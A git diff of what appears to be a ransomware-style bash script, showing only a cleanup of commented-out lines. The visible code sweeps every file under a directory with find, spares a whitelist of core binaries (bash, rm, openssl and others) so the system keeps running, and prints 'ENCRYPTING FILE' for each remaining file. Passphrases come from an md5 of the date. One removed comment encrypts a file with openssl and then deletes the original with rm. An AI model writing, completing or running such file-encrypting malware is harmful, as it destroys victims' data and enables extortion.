@@ -29,7 +29,6 @@ help_menu() {
 # If not arguments are provided, then do ahead
 # and default to a nice little help menu.
 if [ $# -eq 0 ]; then
-  #echo "No arguments supplied!"
   help_menu
   exit 1
 fi
@@ -85,7 +84,6 @@ while getopts h,p,r,z,b,B,d:,l:,e:,H:,P: opt; do
       random_given=true
       ;;
     n) # New password each file
-      #new_each=true
       new_each_given=true
       ;;
     z) # Zip encryption type
@@ -163,7 +161,6 @@ fi
 # Some applications will remain intact 
 protected_applications=( cat wall echo bash ifconfig ls chmod rm openssl )
 white_list=$(printf '%s|' "${protected_applications[@]}")
-#white_list="$(printf '%s\n' "${protected_applications[@]}" | paste -sd '|')"
 
 # Files to iterate through
 files=$(find $directory -type f)
@@ -173,9 +170,6 @@ for file in $files
 do
   # Skip over files which match the application white list
   if [[ ! $file =~ $white_list ]]; then
-    # outfile=$f.lol
-    # `openssl enc -aes-256-cbc -a -salt -in $f -out $outfile -pass pass:$pass -iv $iv`
-    # rm $f
     echo "ENCRYPTING FILE : $file"
     if $new_each_given; then
       passphrase=$(date | md5sum | awk '{print $1}')
